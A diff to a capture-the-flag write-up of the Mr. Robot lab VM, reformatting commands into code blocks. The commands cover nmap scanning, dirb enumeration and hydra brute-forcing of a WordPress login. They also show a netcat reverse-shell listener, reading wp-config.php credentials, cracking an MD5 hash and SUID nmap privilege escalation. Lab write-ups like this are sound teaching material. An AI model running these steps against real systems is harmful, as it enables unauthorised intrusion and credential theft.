@@ -8,12 +8,12 @@
 
 ## Concepts/Tools Used
 
-- nmap
-- dirb
-- hydra
-- netcat
-- SUID/GTFOBins
-- CrackStation
+- [nmap](/tools/nmap.md)
+- [dirb](/tools/dirb.md)
+- [hydra](/tools/hydra.md)
+- [netcat](/tools/netcat.md)
+- [GTFOBins](https://gtfobins.github.io/)
+- [CrackStation](https://crackstation.net/)
 
 ## Description
 
@@ -31,7 +31,9 @@ There is a login screen but I don't have a username or password. I tried admin/a
 
 From here I knew that I needed to get the ip address of the machine so that I could scan it and find out what services were on the machine. When I setup my home lab I limited the ip addresses to the range of 10.22.1.110-130. So I ran the following command to find the machine:
 
-`nmap -sS 10.22.1.110-130`
+```bash
+$ nmap -sS 10.22.1.110-130
+```
 
 It provided output for 2 machines. One of the machines was mine (10.22.1.110) so I ignored the output from that machine. The other machine was the target machine. The machine has 3 ports open:
 
@@ -41,7 +43,9 @@ It provided output for 2 machines. One of the machines was mine (10.22.1.110) so
 
 I can use a password to ssh onto the machine since a password prompt showed up when I ran the following command:
 
-`ssh 10.22.1.112`
+```bash
+$ ssh 10.22.1.112
+```
 
 This lets me know that I can try to brute force login with hydra if I find a username.
 
@@ -53,7 +57,9 @@ I viewed the various pages on the website and viewed the page source. I didn't s
 
 From here I needed to run some directory enumeration to get more information. I ran the following:
 
-`dirb http://10.22.1.112`
+```bash
+$ dirb http://10.22.1.112
+```
 
 #### First Key
 
@@ -77,15 +83,21 @@ Finding the first key file means that the fsociety.dic file is important. I grab
 
 This file is a giant word list. I downloaded the file and ran the following command on it to see how big it was:
 
-`wc -l fsociety.dic`
+```bash
+$ wc -l fsociety.dic
+```
 
 The file is over 800k lines. I wanted to see if there were duplicates. The uniq tool will remove duplicate lines but they must be near each other. So I'll need to make sure the file is sorted as part of the command. I ran the following command:
 
-`sort fsocity.dic | uniq | wc -l`
+```bash
+$ sort fsocity.dic | uniq | wc -l
+```
 
 There are only about 11k unique lines in this file. With that in mind, I saved a copy of the file with just the unique lines using the following command:
 
-`sort fsocity.dic | uniq > test.txt`
+```bash
+$ sort fsocity.dic | uniq > test.txt
+```
 
 #### Admin Login Form
 
@@ -107,7 +119,9 @@ I see a login page and I started to try a few different combinations:
 
 None of these worked. I did notice that the error message doesn't give a generic "your username and password are incorrect" error message. It tells me "Invalid username. Lost your password?". I got the same error message when I tried a few different usernames. If I provide a correct username do I get a different message? So far the only information that I have is the dictionary file that I shortened earlier. I watch the login attempt in the Firefox developer toolbar so I can see the request. Since we have 11k lines in the dictionary file, I don't want to use Burp Suite since it throttles my brute force attempts. I want to use hydra. The command that I used is the following:
 
-`hydra -L test.txt -p admin 10.22.1.112 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'`
+```bash
+$ hydra -L test.txt -p admin 10.22.1.112 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+```
 
 Here is a summary of what is happening:
 - The `-L` option lets hydra know that I want to use a word list of usernames.
@@ -125,7 +139,9 @@ After running the command I got a valid username:
 
 Now that we have the username we need a password. I tried 2 things at once. I ran hydra with the username Elliot and the same word list that I was provided while I looked at some of the other results from dirb. I also took another look at the website pages again to see if there was anything I missed. It didn't take long for hydra to provide the password. Here is the hydra command that I ran:
 
-`hydra -l Elliot -P test.txt 10.22.1.112 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'`
+```bash
+$ hydra -l Elliot -P test.txt 10.22.1.112 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+```
 
 Here is a summary of what is happening:
 - The `-l` option lets hydra know that I want to use Elliot as the username.
@@ -171,7 +187,9 @@ This code will do the following:
 
 That is the payload I am going to use. I need to make sure that my machine is listening on port 4444. I do that with the following command:
 
-`nc -lvnp 4444`
+```bash
+$ nc -lvnp 4444
+```
 
 Here is a breakdown of this command:
 
@@ -206,20 +224,24 @@ Now that I have access to a machine, I need to gather more information. Here are
 
 I am running as the user daemon. When I run the `ls` command, I see that there is a file called wp-config.php. I used the following command to view the contents of that file:
 
-`cat wp-config.php`
+```bash
+$ cat wp-config.php
+```
 
 There are a lot of interesting things in this file. There are credentials for a database user and an ftp user. I noted that information in case I need to go down that path.
 
 I also like the text of the license.txt file. I ran the command `cat license.txt` on it and got the following text:
 
-```
+```text
 do you want a password or something?
 ZWxsaW90OkVSMjgtMDY1Mgo=
 ```
 
 That string is base64 encoded. When I decode it, I get the username and password that I got when I logged into the WordPress admin. I used [CyberChef](https://gchq.github.io/CyberChef/) to base64 decode the string. I don't know if the machine has the base64 command on it. If it does I could have also decoded it by typing:
 
-`echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d `
+```bash
+$ echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+```
 
 Time to look in other places.
 
@@ -234,7 +256,9 @@ The key file is owned by the user robot and only robot can read the file. This i
 
 I was able to cat the password.raw-md5 file:
 
-`cat password.raw-md5`
+```bash
+$ cat password.raw-md5
+```
 
 I saw the following:
 
@@ -244,7 +268,9 @@ I used [CrackStation](https://crackstation.net/) to crack that md5 hash. It prov
 
 On my attack machine, I ran the following command to login as the robot user:
 
-`ssh robot@10.22.1.112`
+```bash
+$ ssh robot@10.22.1.112
+```
 
 I then entered that password that CrackStation gave me. Just like that, I now have a shell on the machine as the robot user. I closed my other shell window.
 
@@ -299,7 +325,9 @@ nmap> !sh
 
 So I verify that the installed nmap is between those 2 version numbers. I run the following command:
 
-`/usr/local/bin/nmap --version`
+```bash
+$ /usr/local/bin/nmap --version
+```
 
 The version is 3.81, it is vulnerable! I run the following commands:
 
@@ -314,7 +342,9 @@ I am in!
 
 I go to the `/root` folder and cat the final flag:
 
-`cat key-3-of-3.txt`
+```bash
+$ cat key-3-of-3.txt
+```
 
 #### Conclusion
 
